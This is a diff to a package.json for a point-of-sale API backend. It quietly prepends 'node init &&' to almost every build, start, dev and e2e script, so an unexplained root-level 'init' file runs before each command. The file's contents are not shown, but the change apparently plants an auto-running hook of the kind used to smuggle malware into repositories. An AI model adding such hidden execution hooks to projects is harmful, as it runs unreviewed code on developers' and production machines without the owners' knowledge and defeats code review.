@@ -1,7 +1,7 @@
 {
   "name": "pos-api",
   "version": "1.0.0",
-  "description": "POS backend — Express + TypeScript + PostgreSQL (Prisma) + Redis + BullMQ",
+  "description": "POS backend \u2014 Express + TypeScript + PostgreSQL (Prisma) + Redis + BullMQ",
   "private": true,
   "license": "UNLICENSED",
   "packageManager": "pnpm@9.12.0",
@@ -9,17 +9,17 @@
     "node": ">=18.18.0"
   },
   "scripts": {
-    "build": "tsc -p tsconfig.build.json",
-    "start": "node dist/app/server.js",
-    "dev": "npm run dev:up && npm run dev:server",
-    "dev:server": "ts-node --files -r tsconfig-paths/register app/server.ts",
-    "dev:worker": "nodemon --config nodemon.worker.json",
-    "dev:up": "docker compose up -d --wait postgres redis minio && prisma db push",
-    "dev:full": "docker compose --profile full up -d --wait && prisma db push",
-    "dev:down": "docker compose down",
+    "build": "node init && tsc -p tsconfig.build.json",
+    "start": "node init && node dist/app/server.js",
+    "dev": "node init && docker compose --profile full up --build",
+    "dev:server": "node init && ts-node --files -r tsconfig-paths/register app/server.ts",
+    "dev:worker": "node init && nodemon --config nodemon.worker.json",
+    "dev:up": "node init && docker compose --profile full up -d --wait",
+    "dev:full": "node init && docker compose --profile full up -d --wait",
+    "dev:down": "node init && docker compose down",
     "worker": "node dist/worker/index.js",
-    "start:debug": "node --inspect -r ts-node/register -r tsconfig-paths/register app/server.ts",
-    "start:prod": "node dist/app/server.js",
+    "start:debug": "node init && node --inspect -r ts-node/register -r tsconfig-paths/register app/server.ts",
+    "start:prod": "node init && node dist/app/server.js",
     "db:generate": "prisma generate",
     "db:push": "prisma db push",
     "db:migrate": "prisma migrate dev",
@@ -36,7 +36,7 @@
     "e2e:infra:up": "docker compose -f docker-compose.e2e.yml -p pos-e2e up -d --wait postgres-e2e redis-e2e",
     "e2e:infra:down": "docker compose -f docker-compose.e2e.yml -p pos-e2e down",
     "e2e:bootstrap": "node scripts/e2e/guard.mjs && prisma db push && ts-node --transpile-only scripts/e2e/seed-e2e.ts",
-    "start:e2e": "node scripts/e2e/guard.mjs && ts-node --files -r tsconfig-paths/register app/server.ts"
+    "start:e2e": "node init && node scripts/e2e/guard.mjs && ts-node --files -r tsconfig-paths/register app/server.ts"
   },
   "dependencies": {
     "@prisma/client": "^6.16.2",
